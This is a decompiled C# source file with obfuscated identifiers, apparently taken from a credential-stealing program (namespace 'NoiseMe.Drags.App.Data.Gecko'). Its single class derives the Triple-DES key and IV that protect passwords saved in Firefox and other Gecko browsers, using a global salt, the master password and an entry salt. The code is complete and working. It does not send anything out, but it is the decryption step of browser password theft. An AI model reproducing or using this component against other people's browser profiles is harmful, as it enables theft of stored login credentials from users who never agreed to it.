using System;
using System.Security.Cryptography;

namespace NoiseMe.Drags.App.Data.Gecko
{
	// Token: 0x0200019F RID: 415
	public class р6прлгв
	{
		// Token: 0x17000340 RID: 832
		// (get) Token: 0x06000D18 RID: 3352 RVA: 0x00009B8E File Offset: 0x00007D8E
		private byte[] _globalSalt { get; }

		// Token: 0x17000341 RID: 833
		// (get) Token: 0x06000D19 RID: 3353 RVA: 0x00009B96 File Offset: 0x00007D96
		private byte[] _masterPassword { get; }

		// Token: 0x17000342 RID: 834
		// (get) Token: 0x06000D1A RID: 3354 RVA: 0x00009B9E File Offset: 0x00007D9E
		private byte[] _entrySalt { get; }

		// Token: 0x17000343 RID: 835
		// (get) Token: 0x06000D1B RID: 3355 RVA: 0x00009BA6 File Offset: 0x00007DA6
		// (set) Token: 0x06000D1C RID: 3356 RVA: 0x00009BAE File Offset: 0x00007DAE
		public byte[] DataKey { get; private set; }

		// Token: 0x17000344 RID: 836
		// (get) Token: 0x06000D1D RID: 3357 RVA: 0x00009BB7 File Offset: 0x00007DB7
		// (set) Token: 0x06000D1E RID: 3358 RVA: 0x00009BBF File Offset: 0x00007DBF
		public byte[] DataIV { get; private set; }

		// Token: 0x06000D1F RID: 3359 RVA: 0x00009BC8 File Offset: 0x00007DC8
		public р6прлгв(byte[] salt, byte[] password, byte[] entry)
		{
			this._globalSalt = salt;
			this._masterPassword = password;
			this._entrySalt = entry;
		}

		// Token: 0x06000D20 RID: 3360 RVA: 0x00029AB8 File Offset: 0x00027CB8
		public void го7па()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this._globalSalt.Length + this._masterPassword.Length];
			Array.Copy(this._globalSalt, 0, array, 0, this._globalSalt.Length);
			Array.Copy(this._masterPassword, 0, array, this._globalSalt.Length, this._masterPassword.Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this._entrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this._entrySalt, 0, array3, array2.Length, this._entrySalt.Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this._entrySalt, 0, array4, 0, this._entrySalt.Length);
			for (int i = this._entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this._entrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this._entrySalt, 0, array5, array4.Length, this._entrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this._entrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this._entrySalt, 0, array8, array7.Length, this._entrySalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}
	}
}
